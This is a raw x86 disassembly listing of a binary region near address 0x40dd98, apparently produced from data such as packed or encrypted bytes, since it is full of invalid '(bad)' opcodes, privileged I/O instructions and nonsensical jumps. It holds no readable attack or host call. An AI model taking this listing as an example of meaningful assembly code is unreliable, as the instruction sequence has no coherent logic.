  40dd98:	xor    al,0x14
  40dd9a:	and    al,bl
  40dd9c:	fcomp  DWORD PTR [edi+0x23]
  40dd9f:	int    0x51
  40dda1:	jg     0x40ddb6
  40dda3:	xchg   edx,eax
  40dda4:	aaa    
  40dda5:	push   es
  40dda6:	enter  0xdbfe,0x0
  40ddaa:	test   al,0x8c
  40ddac:	dec    ebx
  40ddad:	(bad)  
  40ddae:	push   ebx
  40ddaf:	ret    
  40ddb0:	repz add eax,0x9ddeb591
  40ddb6:	inc    DWORD PTR [esi+0x257ba302]
  40ddbc:	lahf   
  40ddbd:	dec    esi
  40ddbe:	xor    ecx,eax
  40ddc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddc1:	dec    ecx
  40ddc2:	push   edx
  40ddc3:	jb     0x40de0b
  40ddc5:	cmp    eax,0xf4fb5f27
  40ddca:	jmp    0x40dd9c
  40ddcc:	scas   al,BYTE PTR es:[edi]
  40ddcd:	test   al,0xcf
  40ddcf:	jo     0x40dd78
  40ddd1:	retf   
  40ddd2:	dec    ebx
  40ddd3:	scas   al,BYTE PTR es:[edi]
  40ddd4:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40ddd6:	aad    0xcc
  40ddd8:	mov    esp,0xb7661eef
  40dddd:	int    0x74
  40dddf:	(bad)  
  40dde0:	jmp    0xbeae:0x6b7f13e3
  40dde7:	dec    esi
  40dde8:	cs add ebp,ecx
  40ddeb:	int3   
  40ddec:	psubsb mm5,QWORD PTR [ebp+0x2ed67f7d]
  40ddf3:	lds    ebx,FWORD PTR [ebx]
  40ddf5:	and    edx,DWORD PTR [ebx]
  40ddf7:	sub    eax,0xe7169be8
  40ddfc:	dec    ebp
  40ddfd:	mov    esp,0x1e538485
  40de02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de03:	fdivr  QWORD PTR fs:[eax-0x13eb984]
  40de0a:	imul   ecx,DWORD PTR ds:0xd7225b9c,0xe
  40de11:	mov    bh,0xc2
  40de13:	mov    ah,0x52
  40de15:	cs out 0x3a,al
  40de18:	mov    bl,dl
  40de1a:	stc    
  40de1b:	pop    es
  40de1c:	into   
  40de1d:	scas   al,BYTE PTR es:[edi]
  40de1e:	jae    0x40de72
  40de20:	repz out dx,eax
  40de22:	inc    esi
  40de23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de24:	shl    BYTE PTR [ecx],cl
  40de26:	fnstcw WORD PTR [esi-0x34]
  40de29:	cmp    eax,0xa94543fb
  40de2e:	bts    DWORD PTR [esi+ebp*4+0x4a],ebp
  40de33:	enter  0xe10a,0x35
  40de37:	push   ss
  40de38:	jno    0x40de60
  40de3a:	rcr    BYTE PTR [ebx],cl
  40de3c:	(bad)  
  40de3d:	fidiv  DWORD PTR [esi-0x41]
  40de40:	pop    ds
  40de41:	mov    ah,0xd2
  40de43:	icebp  
  40de44:	mov    ch,0x51
  40de46:	xor    al,0xb6
  40de48:	adc    eax,edi
  40de4a:	shr    DWORD PTR [eax+0x2e],cl
  40de4d:	cmp    eax,0xfd5cd5c
  40de52:	mov    ebp,0x4f1a7dad
  40de57:	cmp    ecx,DWORD PTR [esi+0xe0dda15]
  40de5d:	(bad)  
  40de5e:	jns    0x40de9c
  40de60:	mov    edi,0x10833b61
  40de65:	(bad)  
  40de66:	out    dx,al
  40de67:	cmp    DWORD PTR [esi-0x4f],0xe9376b84
  40de6e:	in     eax,dx
  40de6f:	pop    es
  40de70:	adc    BYTE PTR [ecx+eax*2-0xe94fff0],bh
  40de77:	in     al,dx
  40de78:	jmp    0xfdc688ee
  40de7d:	push   es
  40de7e:	test   ecx,0xbf329a67
  40de84:	les    eax,FWORD PTR ds:0x476e6895
  40de8a:	aaa    
  40de8b:	repz rcl DWORD PTR [ebp+ebx*4-0xb11a0db],0x60
  40de94:	mov    cl,0xa7
  40de96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de97:	lods   al,BYTE PTR ds:[esi]
  40de98:	ror    DWORD PTR [ecx-0x7f],cl
  40de9b:	push   0xe3e1a6c3
  40dea0:	nop
  40dea1:	cmc    
  40dea2:	sub    eax,0x562df524
  40dea7:	les    eax,FWORD PTR [edi+0x7659fa83]
  40dead:	xchg   edx,eax
  40deae:	mov    edi,0x670337d
  40deb3:	sti    
  40deb4:	ret    
  40deb5:	xchg   ecx,eax
  40deb6:	in     eax,dx
  40deb7:	cmp    bl,dh
  40deb9:	lock inc edi
  40debb:	repz out 0x69,eax
  40debe:	add    ecx,DWORD PTR [ebx-0x44]
  40dec1:	pop    eax
  40dec2:	xchg   esi,eax
  40dec3:	aad    0x62
  40dec5:	iret   
  40dec6:	std    
  40dec7:	dec    ecx
  40dec8:	loope  0x40de91
  40deca:	ins    DWORD PTR es:[edi],dx
  40decb:	jmp    0xe71:0x4eba8529
  40ded2:	icebp  
  40ded3:	ret    
  40ded4:	sub    BYTE PTR [edx],0x66
  40ded7:	aam    0x66
  40ded9:	mov    ds:0xaa7b65c1,al
  40dede:	in     eax,0xf9
  40dee0:	pop    esp
  40dee1:	inc    edx
  40dee2:	xchg   edi,eax
  40dee3:	popf   
  40dee4:	xchg   edx,eax
  40dee5:	mov    dl,0x5a
  40dee7:	ret    0xd3ac
  40deea:	adc    al,0x4c
  40deec:	jno    0x40df22
  40deee:	pop    ebp
  40deef:	inc    ebp
  40def0:	fild   DWORD PTR [ecx-0x40]
  40def3:	lds    esp,FWORD PTR [ebx]
  40def5:	xchg   DWORD PTR [esi],esi
  40def7:	mov    al,BYTE PTR [ecx-0x16ecd3e8]
  40defd:	sub    ebx,DWORD PTR [edi-0x37]
  40df00:	int3   
  40df01:	repnz aam 0x9d
  40df04:	test   BYTE PTR [edx+esi*1+0x67],0x6b
  40df09:	fisub  WORD PTR [ebx]
  40df0b:	or     BYTE PTR [ecx],dl
  40df0d:	pop    ecx
  40df0e:	test   al,0xe7
  40df10:	fwait
  40df11:	mov    DWORD PTR [edi-0x2b],esi
  40df14:	mov    ch,0xa6
  40df16:	mov    WORD PTR [edi-0x48],?
  40df19:	stc    
  40df1a:	fstp   QWORD PTR ss:[edx]
  40df1d:	pop    ds
  40df1e:	fdiv   st,st(4)
  40df20:	out    dx,eax
  40df21:	outs   dx,DWORD PTR ds:[esi]
  40df22:	int    0x46
  40df24:	fldlg2 
  40df26:	jbe    0x40df7d
  40df28:	fiadd  DWORD PTR [ebx+0xace2b74]
  40df2f:	nop
  40df30:	stos   BYTE PTR es:[edi],al
  40df31:	shl    ch,1
  40df33:	pop    edi
  40df34:	retf   0x1438
  40df37:	inc    ebx
  40df38:	mov    esp,0xca072709
  40df3d:	dec    edx
  40df3e:	addr16 push cs
  40df40:	lods   eax,DWORD PTR ds:[esi]
  40df41:	xchg   esi,eax
  40df42:	and    DWORD PTR [esi-0x1086578f],edx
  40df48:	xchg   ecx,eax
  40df49:	(bad)  
  40df4a:	maxps  xmm1,XMMWORD PTR [ebx-0x62]
  40df4e:	pop    eax
  40df4f:	(bad)  
  40df50:	dec    ebp
  40df51:	push   es
  40df52:	loopne 0x40defa
  40df54:	sti    
  40df55:	mov    ecx,0xb64d2ed2
  40df5a:	mov    dl,0x3f
  40df5c:	test   eax,0xa5cb1cf5
  40df61:	or     DWORD PTR [eax-0xeb21370],ebp
  40df67:	sub    BYTE PTR [eax-0x43a9b7b],ch
  40df6d:	mov    ds,WORD PTR [edi]
  40df6f:	lea    ecx,[edx-0x4df55b3b]
  40df75:	jmp    0x40df07
  40df77:	inc    ebp
  40df78:	gs cmp ebp,eax
  40df7b:	rcl    DWORD PTR [edi-0x3da87591],0xe2
  40df82:	icebp  
  40df83:	and    cl,BYTE PTR [edx-0x2]
  40df86:	add    al,BYTE PTR [edx]
  40df88:	bound  edx,QWORD PTR [ecx+0x105e0c28]
  40df8e:	cld    
  40df8f:	jae    0x40dfde
  40df91:	cmp    DWORD PTR [ecx+0x5c622204],esp
  40df97:	sar    BYTE PTR [edi],0xa1
  40df9a:	mov    ebp,0x50a1fdfc
  40df9f:	lods   al,BYTE PTR ds:[esi]
  40dfa0:	sbb    al,0x44
  40dfa2:	mov    ah,al
  40dfa4:	das    
  40dfa5:	cli    
  40dfa6:	(bad)  
  40dfa8:	xchg   ebp,eax
  40dfa9:	retf   0x4b76
  40dfac:	aaa    
  40dfad:	cs mov ch,0xa8
  40dfb0:	cmp    BYTE PTR [edi-0x26517140],0x29
  40dfb7:	jne    0x40dfdb
  40dfb9:	sub    al,0x6a
  40dfbb:	push   esp
  40dfbc:	mov    bh,0x74
  40dfbe:	in     eax,dx
  40dfbf:	lea    eax,gs:[esi-0x19]
  40dfc3:	inc    esi
  40dfc4:	xchg   edi,eax
  40dfc5:	push   ebp
  40dfc6:	sbb    al,0x3b
  40dfc8:	test   eax,0xffb069f1
  40dfcd:	addr16 hlt 
  40dfcf:	jge    0x40df6f
  40dfd1:	in     eax,0x27
  40dfd3:	push   ebp
  40dfd4:	cs mov bh,0x3d
  40dfd7:	fist   WORD PTR ds:0x2bb1adba
  40dfdd:	add    eax,0x77af4eff
  40dfe2:	rol    DWORD PTR [edx],1
  40dfe4:	stc    
  40dfe5:	adc    BYTE PTR [eax+0x210e7642],dh
  40dfeb:	push   cs
  40dfec:	jns    0x40df77
  40dfee:	jnp    0x40e04e
  40dff0:	std    
  40dff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dff3:	cdq    
  40dff4:	inc    eax
  40dff5:	add    DWORD PTR [esi+0x2d],eax
  40dff8:	test   DWORD PTR [edi+0x17],edx
  40dffb:	push   0x9e9fb879
  40e000:	mov    ds:0xee833bb1,al
  40e005:	fdivr  QWORD PTR [ebx+0x4c]
  40e008:	adc    cl,BYTE PTR [ecx+eiz*2+0x54]
  40e00c:	ss or  bl,dl
  40e00f:	pop    es
  40e010:	enter  0xd204,0x77
  40e014:	retf   0x1a6f
  40e017:	jne    0x40e084
  40e019:	sar    ecx,1
  40e01b:	adc    eax,0xa950f21
  40e020:	scas   al,BYTE PTR es:[edi]
  40e021:	sbb    DWORD PTR [ebp+0x12],eax
  40e024:	adc    BYTE PTR ds:0xb23ca3d3,bh
  40e02a:	lods   eax,DWORD PTR ds:[esi]
  40e02b:	int    0xed
  40e02d:	into   
  40e02e:	fidivr WORD PTR [ebx-0x2ef74ef9]
  40e034:	ins    BYTE PTR es:[edi],dx
  40e035:	shr    bh,0xb2
  40e038:	dec    esi
  40e039:	ja     0x40e0a1
  40e03b:	push   esp
  40e03c:	or     esi,DWORD PTR [esi-0x37]
  40e03f:	adc    al,0xaf
  40e041:	push   edi
  40e042:	leave  
  40e043:	pop    ebp
  40e044:	xchg   ebp,eax
  40e045:	sahf   
  40e046:	adc    eax,0x7427cf24
  40e04b:	or     ecx,DWORD PTR [edx]
  40e04d:	and    BYTE PTR [ecx+0x29],ah
  40e050:	rol    BYTE PTR [ecx],0xf3
  40e053:	into   
  40e054:	aam    0xb3
  40e056:	sub    BYTE PTR [edx-0x67e7f55c],dl
  40e05c:	or     esp,DWORD PTR [ecx]
  40e05e:	add    eax,0x9235bba3
  40e063:	mov    edi,0x6f361a47
  40e068:	mov    ds:0x5d3cf2b1,al
  40e06d:	dec    esi
  40e06e:	xor    al,0x49
  40e070:	jae    0x40e072
  40e072:	popa   
  40e073:	sbb    bl,cl
  40e075:	add    dl,bh
  40e077:	and    eax,0x9fc1344c
  40e07c:	shl    DWORD PTR [esi],0xea
  40e07f:	retf   
  40e080:	xor    dh,BYTE PTR [esi-0x19]
  40e083:	mov    esp,0x5d2e7b62
  40e088:	mov    ch,BYTE PTR [ebx+0x6e]
  40e08b:	jbe    0x40e046
  40e08d:	or     eax,0x5d2c8822
  40e092:	xlat   BYTE PTR ds:[ebx]
  40e093:	cld    
  40e094:	mov    edi,0x23457189
  40e099:	push   cs
  40e09a:	pushf  
  40e09b:	imul   eax,DWORD PTR [esi+ecx*2+0xfe048f6],0xffffffc5
  40e0a3:	add    BYTE PTR [esi],dl
  40e0a5:	push   eax
  40e0a6:	and    DWORD PTR [eax+0x0],edi
  40e0a9:	addr16 aam 0xe
  40e0ac:	out    0xa2,al
  40e0ae:	cmp    BYTE PTR [ebp+0x42],cl
  40e0b1:	cmp    eax,0x4f6929b7
  40e0b6:	pop    esp
  40e0b7:	mov    al,ds:0x6227d952
  40e0bc:	arpl   WORD PTR [ebx],ax
  40e0be:	sub    eax,0xdaf41a5e
  40e0c3:	cmp    DWORD PTR [eax],0xbfc8e9f4
  40e0c9:	add    ecx,DWORD PTR [edi+0x5025147a]
  40e0cf:	xor    al,0x49
  40e0d1:	push   ss
  40e0d2:	cmc    
  40e0d3:	fdiv   st,st(2)
  40e0d5:	jge    0x40e134
  40e0d7:	sahf   
  40e0d8:	pop    ss
  40e0d9:	pop    esp
  40e0da:	and    al,0x69
  40e0dc:	jnp    0x40e0a8
  40e0de:	push   ebp
  40e0df:	lods   al,BYTE PTR ds:[esi]
  40e0e0:	jo     0x40e095
  40e0e2:	jo     0x40e152
  40e0e4:	test   al,0xce
  40e0e6:	push   ecx
  40e0e7:	lahf   
  40e0e8:	inc    edx
  40e0e9:	aaa    
  40e0ea:	popf   
  40e0eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0ec:	js     0x40e15f
  40e0ee:	add    al,bh
  40e0f0:	push   es
  40e0f1:	push   ds
  40e0f2:	in     al,dx
  40e0f3:	mov    bl,0xf5
  40e0f5:	call   0x4cc588b9
  40e0fa:	(bad)  
  40e0fc:	push   cs
  40e0fd:	fist   WORD PTR [ecx]
  40e0ff:	sub    al,0x5d
  40e101:	mov    cl,0xdd
  40e103:	ins    BYTE PTR es:[edi],dx
  40e104:	rcr    BYTE PTR ds:0xb3e90be8,cl
  40e10a:	sahf   
  40e10b:	scas   al,BYTE PTR es:[edi]
  40e10c:	into   
  40e10d:	(bad)  
  40e10e:	jbe    0x40e096
  40e110:	adc    ecx,DWORD PTR [edi+edx*8-0x2c3e3cd0]
  40e117:	sbb    ax,0x3cf7
  40e11b:	xchg   cl,cl
  40e11d:	(bad)  
  40e11e:	push   ss
  40e11f:	pop    esi
  40e120:	hlt    
  40e121:	xchg   edx,eax
  40e122:	or     BYTE PTR [ecx],ch
  40e124:	push   esi
  40e125:	add    BYTE PTR es:[edx-0x73],al
  40e129:	shl    BYTE PTR [esp+ebp*1-0x55],cl
  40e12d:	clc    
  40e12e:	fadd   DWORD PTR [bp+0x12]
  40e132:	adc    BYTE PTR [ecx+0x42d4d372],dh
  40e138:	jmp    0x779433fa
  40e13d:	shr    DWORD PTR [edi],1
  40e13f:	stos   BYTE PTR es:[edi],al
  40e140:	cmp    DWORD PTR [ebx-0x5f3e482e],eax
  40e146:	xlat   BYTE PTR ds:[ebx]
  40e147:	je     0x40e19d
  40e149:	jmp    0x40e17f
  40e14b:	sub    al,0xe3
  40e14d:	stos   DWORD PTR es:[edi],eax
  40e14e:	sbb    al,0xd1
  40e150:	mov    bl,0x30
  40e152:	or     eax,0x8ac88cc8
  40e157:	pop    es
  40e158:	push   0x17
  40e15a:	adc    DWORD PTR [edi-0x2e46638d],ecx
  40e160:	das    
  40e161:	call   0xb1b0366e
  40e166:	stos   DWORD PTR es:[edi],eax
  40e167:	sar    DWORD PTR [esi+edx*2-0x55],0x60
  40e16c:	aad    0xe9
  40e16e:	lea    ecx,[edi]
  40e170:	cmp    BYTE PTR [esi-0x66],al
  40e173:	gs sbb esi,ecx
  40e176:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40e178:	mov    fs,ebx
  40e17a:	dec    esi
  40e17b:	scas   eax,DWORD PTR es:[edi]
  40e17c:	nop
  40e17d:	push   edi
  40e17e:	mov    bl,0xad
  40e180:	xchg   esp,eax
  40e181:	mov    DWORD PTR [edx+0x48],edx
  40e184:	jne    0x40e170
  40e186:	sub    edi,DWORD PTR [edi]
  40e188:	outs   dx,DWORD PTR ds:[esi]
  40e189:	dec    ecx
  40e18a:	jo     0x40e12e
  40e18c:	cmovnp ebx,DWORD PTR [ebx-0x4072d013]
  40e193:	leave  
  40e194:	loope  0x40e13d
  40e196:	cdq    
  40e197:	jnp    0x40e1cb
  40e199:	pop    edx
  40e19a:	ins    BYTE PTR es:[edi],dx
  40e19b:	ss scas eax,DWORD PTR es:[edi]
  40e19d:	xchg   esp,edx
  40e19f:	fwait
  40e1a0:	push   ss
  40e1a1:	leave  
  40e1a2:	mov    ebp,0xcd124719
  40e1a7:	inc    ecx
  40e1a8:	adc    edx,DWORD PTR ds:[esi+0x4f6c6a51]
  40e1af:	mov    ds:0xcd1929d6,al
  40e1b4:	sbb    eax,0x551f9baf
  40e1b9:	icebp  
  40e1ba:	inc    ecx
  40e1bb:	cmp    edx,edi
  40e1bd:	ins    DWORD PTR es:[edi],dx
  40e1be:	pushf  
  40e1bf:	lahf   
  40e1c0:	xchg   ebx,eax
  40e1c1:	dec    edi
  40e1c2:	scas   eax,DWORD PTR es:[edi]
  40e1c3:	and    DWORD PTR [esi],0xbf81ffec
  40e1c9:	data16 mov cl,0x93
  40e1cc:	jecxz  0x40e21a
  40e1ce:	(bad)  
  40e1cf:	(bad)  
  40e1d0:	mov    dl,0x78
  40e1d2:	xchg   edi,eax
  40e1d3:	xchg   esi,eax
  40e1d4:	and    esi,DWORD PTR [ebp+eiz*2+0x2e4e075a]
  40e1db:	nop
  40e1dc:	test   eax,0x473d3b12
  40e1e1:	lods   al,BYTE PTR ds:[esi]
  40e1e2:	icebp  
  40e1e3:	inc    ebx
  40e1e4:	cmp    ch,ah
  40e1e6:	add    dh,bh
  40e1e8:	test   edi,edi
  40e1ea:	ins    BYTE PTR es:[edi],dx
  40e1eb:	pop    ecx
  40e1ec:	shl    DWORD PTR [ebx+0x41],1
  40e1ef:	shl    DWORD PTR [ecx-0x19],0x0
  40e1f3:	fdivr  DWORD PTR [esi]
  40e1f5:	ror    BYTE PTR [eax-0x47a4b08c],0xd0
  40e1fc:	aam    0xc1
  40e1fe:	xlat   BYTE PTR ds:[ebx]
  40e1ff:	and    BYTE PTR [ebx+esi*8],bh
  40e202:	jno    0x40e1b3
  40e204:	fisttp QWORD PTR [eax+0x6d231b18]
  40e20a:	jmp    0x33f68121
  40e20f:	clc    
  40e210:	repz aad 0x7
  40e213:	pop    ds
  40e214:	(bad)  
  40e215:	call   0xda005aab
  40e21a:	int    0x29
  40e21c:	inc    ecx
  40e21d:	push   ss
  40e21e:	into   
  40e21f:	jnp    0x40e257
  40e221:	add    al,0x90
  40e223:	ja     0x40e252
  40e225:	sbb    al,0x48
  40e227:	pop    eax
  40e228:	mov    ebp,0xf28e9f03
  40e22d:	cmp    eax,DWORD PTR ds:0xd545d68f
  40e233:	xor    ah,BYTE PTR [ebp+0x46e398bc]
  40e239:	out    0xb3,al
  40e23b:	pop    DWORD PTR [ebx-0x2a]
  40e23e:	jb     0x40e26b
  40e240:	out    dx,al
  40e241:	jecxz  0x40e1e9
  40e243:	mov    eax,DWORD PTR [ecx-0x24]
  40e246:	outs   dx,BYTE PTR ds:[esi]
  40e247:	inc    ecx
  40e248:	das    
  40e249:	inc    ecx
  40e24a:	xor    dh,0x42
  40e24d:	xchg   BYTE PTR ds:0x1ab9a0b4,ch
  40e253:	daa    
  40e254:	or     eax,0xee303f0a
  40e259:	xlat   BYTE PTR ds:[ebx]
  40e25a:	lock or esp,edi
  40e25d:	into   
  40e25e:	add    ebx,ecx
  40e260:	xchg   esi,eax
  40e261:	out    dx,al
  40e262:	cmp    eax,DWORD PTR [edi-0x51]
  40e265:	and    eax,DWORD PTR ds:0xce86eee5
  40e26b:	push   ss
  40e26c:	(bad)  
  40e26d:	inc    ecx
  40e26e:	sbb    bl,BYTE PTR [ecx]
  40e270:	xchg   DWORD PTR [ecx+0x6c],ebx
  40e273:	outs   dx,DWORD PTR ds:[esi]
  40e274:	add    DWORD PTR [edi-0x47920a96],0xe4675420
  40e27e:	xchg   esp,eax
  40e27f:	mov    ds:0xf4ea1a6c,al
  40e284:	and    edi,esi
  40e286:	ins    DWORD PTR es:[edi],dx
  40e287:	inc    ebx
  40e288:	sub    eax,0x4b9fab45
  40e28d:	add    BYTE PTR [edx],bh
  40e28f:	fcomp  QWORD PTR [edx]
  40e291:	push   cs
  40e292:	lds    edx,FWORD PTR [edx+0x335d9009]
  40e298:	js     0x40e24f
  40e29a:	xchg   DWORD PTR [esp+ebx*8],esp
  40e29d:	xor    ebp,DWORD PTR [edi+0x3f77d49c]
  40e2a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2a4:	pop    es
  40e2a5:	jne    0x40e22a
  40e2a7:	ins    BYTE PTR es:[edi],dx
  40e2a8:	ret    
  40e2a9:	jnp    0x40e26e
  40e2ab:	pop    edx
  40e2ac:	(bad)  
  40e2ad:	aam    0xaa
  40e2af:	jp     0x40e26f
  40e2b1:	clc    
  40e2b2:	pop    eax
  40e2b3:	mov    esi,0x4b93c24e
  40e2b8:	retf   
  40e2b9:	xchg   edx,eax
  40e2ba:	(bad)  
  40e2bb:	iret   
  40e2bc:	ins    BYTE PTR es:[edi],dx
  40e2bd:	shr    edx,1
  40e2bf:	rcl    DWORD PTR [edi-0x7c],0x61
  40e2c3:	push   ebp
  40e2c4:	mov    bh,0x57
  40e2c6:	or     al,0x86
  40e2c8:	and    BYTE PTR [ebx+0x26d73662],0x6
  40e2cf:	out    dx,al
  40e2d0:	out    dx,eax
  40e2d1:	mov    eax,ds:0x9ede646a
  40e2d6:	mov    ah,0xd2
  40e2d8:	jmp    0x40e28b
  40e2da:	in     al,0x87
  40e2dc:	sbb    dh,bh
  40e2de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2df:	mov    ebp,0x36943288
  40e2e4:	mov    dl,0xaf
  40e2e6:	jmp    0x40e297
  40e2e8:	jl     0x40e2c8
  40e2ea:	mov    esp,0xe5a3924a
  40e2ef:	mov    edi,0xb0daaef7
  40e2f4:	sub    bl,bl
  40e2f6:	out    dx,eax
  40e2f7:	pop    ds
  40e2f8:	sbb    dh,BYTE PTR ds:0x34fb6340
  40e2fe:	jmp    0x91fe18ce
  40e303:	pop    edi
  40e304:	push   0x2e5d674e
  40e309:	in     al,dx
  40e30a:	neg    ch
  40e30c:	jmp    0x940eee69
  40e311:	sub    BYTE PTR [ecx-0x2],bl
  40e314:	std    
  40e315:	stc    
  40e316:	ret    0x6c9a
  40e319:	mov    esi,0xac3390f8
  40e31e:	sub    bl,cl
  40e320:	retf   
  40e321:	mov    dh,0x40
  40e323:	cs dec bh
  40e326:	jns    0x40e2b7
  40e328:	outs   dx,DWORD PTR ds:[esi]
  40e329:	inc    esi
  40e32a:	jae    0x40e2f5
  40e32c:	call   DWORD PTR [ebp+0x33]
  40e32f:	call   0x81a2:0xd62f7568
  40e336:	xchg   esp,eax
  40e337:	xchg   DWORD PTR [edi-0xe8b0f33],esp
  40e33d:	mov    cl,0x48
  40e33f:	xchg   esp,eax
  40e340:	imul   al
  40e342:	adc    eax,0xd0b8c45e
  40e347:	inc    edx
  40e348:	nop
  40e349:	int3   
  40e34a:	mov    dl,0x84
  40e34c:	cmp    BYTE PTR [eax+0x5d5bb9ec],al
  40e352:	mov    ds:0x1f56d033,eax
  40e357:	aam    0x17
  40e359:	icebp  
  40e35a:	lea    ecx,[edx-0x54]
  40e35d:	mov    ah,0x5e
  40e35f:	xchg   ebx,eax
  40e360:	stos   DWORD PTR es:[edi],eax
  40e361:	(bad)  
  40e362:	mov    ch,0x7a
  40e364:	ror    BYTE PTR [eax+0x39],1
  40e367:	mov    bh,0x5b
  40e369:	dec    edi
  40e36a:	xrelease xchg BYTE PTR [ebp-0x70a2199b],cl
  40e371:	popf   
  40e372:	and    DWORD PTR [ebp+0x1c6331d1],esi
  40e378:	or     eax,0x304212
  40e37d:	jle    0x40e35a
  40e37f:	and    BYTE PTR [ebp+0x48],bl
  40e382:	mov    eax,ds:0xde574d18
  40e387:	jl     0x40e326
  40e389:	cmc    
  40e38a:	xor    eax,ecx
  40e38c:	xchg   ebp,eax
  40e38d:	mov    edx,0x688e0f18
  40e392:	leave  
  40e393:	pop    edi
  40e394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e395:	cmp    BYTE PTR ds:[edi-0x1a],bh
  40e399:	push   ss
  40e39a:	int3   
  40e39b:	lds    eax,FWORD PTR [ebx+0x1d]
  40e39e:	mov    ds:0xddc2dca6,eax
  40e3a3:	and    al,0xfe
  40e3a5:	mov    ch,0x16
  40e3a7:	aaa    
  40e3a8:	scas   eax,DWORD PTR es:[edi]
  40e3a9:	cs sti 
  40e3ab:	push   0x54129356
  40e3b0:	or     BYTE PTR es:[ebp+0x68b9db21],dl
  40e3b7:	push   esi
  40e3b8:	retf   
  40e3b9:	imul   ebp,DWORD PTR [edx+ebp*1],0xa
  40e3bd:	rcr    BYTE PTR [ebx],0x54
  40e3c0:	out    0x25,al
  40e3c2:	push   DWORD PTR [esi]
  40e3c4:	hlt    
  40e3c5:	outs   dx,DWORD PTR ds:[esi]
  40e3c6:	xor    ebx,esi
  40e3c8:	pop    ds
  40e3c9:	inc    esp
  40e3ca:	rcr    BYTE PTR [edi+0x6b],0x98
  40e3ce:	pop    ds
  40e3cf:	enter  0xc26f,0x74
  40e3d3:	daa    
  40e3d4:	dec    eax
  40e3d5:	test   al,0x29
  40e3d7:	xchg   edi,eax
  40e3d8:	xchg   eax,eax
  40e3da:	mov    dh,BYTE PTR [ebp-0xaa10c67]
  40e3e0:	pop    esi
  40e3e1:	push   esi
  40e3e2:	hlt    
  40e3e3:	inc    edi
  40e3e4:	xchg   edi,eax
  40e3e5:	sbb    bl,al
  40e3e7:	scas   al,BYTE PTR es:[edi]
  40e3e8:	push   0xd33bf4b1
  40e3ed:	scas   eax,DWORD PTR es:[edi]
  40e3ee:	out    0x90,al
  40e3f0:	mov    cl,0x7
  40e3f2:	cmp    BYTE PTR [eax+0x61],0x8a
  40e3f6:	sahf   
  40e3f7:	jle    0x40e3b9
  40e3f9:	shl    DWORD PTR [eax-0x66],1
  40e3fc:	(bad)  
  40e3fd:	adc    eax,0x9e97c0aa
  40e402:	int3   
  40e403:	push   ss
  40e404:	sahf   
  40e405:	jbe    0x40e45c
  40e407:	aam    0x2d
  40e409:	mov    ecx,0xb61ceb3e
  40e40e:	scas   al,BYTE PTR es:[edi]
  40e40f:	lahf   
  40e410:	jne    0x40e3d3
  40e412:	inc    ecx
  40e413:	mov    ds:0x8bc622a7,al
  40e418:	sbb    DWORD PTR [esi],ebp
  40e41a:	loopne 0x40e3c3
  40e41c:	repz cwde 
  40e41e:	leave  
  40e41f:	aad    0xc2
  40e421:	ret    0x52b4
  40e424:	or     DWORD PTR [edx],ebp
  40e426:	test   DWORD PTR [eax],edx
  40e428:	int    0x76
  40e42a:	inc    esp
  40e42b:	push   esp
  40e42c:	cmp    BYTE PTR [ebx-0x1fbad3c7],al
  40e432:	xor    DWORD PTR [ebx+0x7c09c80e],esi
  40e438:	cmp    BYTE PTR [edx],bh
  40e43a:	into   
  40e43b:	or     eax,0x2eb2067
  40e440:	pop    ds
  40e441:	out    dx,al
  40e442:	imul   eax,DWORD PTR [ecx+0x6942bf12],0xffffff88
  40e449:	mov    ebx,0xbe0fb138
  40e44e:	icebp  
  40e44f:	mov    al,ds:0x373e96cd
  40e454:	shr    BYTE PTR [esi-0x67],0x76
  40e458:	mov    ebp,0x2315e9cf
  40e45d:	inc    edi
  40e45e:	nop
  40e45f:	test   ch,al
  40e461:	push   cs
  40e462:	mov    esi,0x5b13c841
  40e467:	mov    ds:0xc962489c,al
  40e46c:	and    eax,0xe624eca
  40e471:	sub    DWORD PTR [eax+0x4e],edi
  40e474:	mov    DWORD PTR [ecx-0x6a],ebp
  40e477:	sti    
  40e478:	and    al,0x69
  40e47a:	and    al,0x52
  40e47c:	out    dx,al
  40e47d:	xchg   ebx,eax
  40e47e:	sub    al,0xc3
  40e480:	ss pop ecx
  40e482:	mov    ebp,0x3975a846
  40e487:	retf   0xaef5
  40e48a:	stc    
  40e48b:	and    al,0xb5
  40e48d:	inc    ecx
  40e48e:	and    esp,DWORD PTR [ecx+esi*4+0x556fe619]
  40e495:	hlt    
  40e496:	inc    esi
  40e497:	fnstsw WORD PTR [ebp-0x6d9a1e]
  40e49d:	xchg   edi,eax
  40e49e:	es pusha 
  40e4a0:	adc    al,0x4c
  40e4a2:	iret   
  40e4a3:	sbb    bh,BYTE PTR [ebp-0x30c227d8]
  40e4a9:	mov    dh,0xd0
  40e4ab:	js     0x40e4cb
  40e4ad:	push   edi
  40e4ae:	retf   
  40e4af:	add    esp,esi
  40e4b1:	or     BYTE PTR [eax],dl
  40e4b3:	jg     0x40e49d
  40e4b5:	out    dx,al
  40e4b6:	mov    al,0x36
  40e4b8:	add    eax,0x43a59d76
  40e4bd:	fld    DWORD PTR [edi+0x757291f3]
  40e4c3:	pop    ebp
  40e4c4:	mov    edi,DWORD PTR [edx+0x4d6682f9]
  40e4ca:	sahf   
  40e4cb:	loop   0x40e45a
  40e4cd:	mov    BYTE PTR [edx+0x28],cl
  40e4d0:	inc    esi
  40e4d1:	enter  0x4e66,0x8c
  40e4d5:	popf   
  40e4d6:	out    0x62,al
  40e4d8:	sbb    DWORD PTR [ebx+0x68f55f75],esi
  40e4de:	and    BYTE PTR [ebp+0x43303035],ah
  40e4e4:	shl    BYTE PTR [eax],cl
  40e4e6:	add    edi,DWORD PTR [edi-0xb]
  40e4e9:	lods   eax,DWORD PTR ds:[esi]
  40e4ea:	(bad)  
  40e4eb:	dec    ebx
  40e4ec:	sub    al,0x4f
  40e4ee:	dec    esp
  40e4ef:	imul   esp,DWORD PTR [esi+0x1e],0x7a
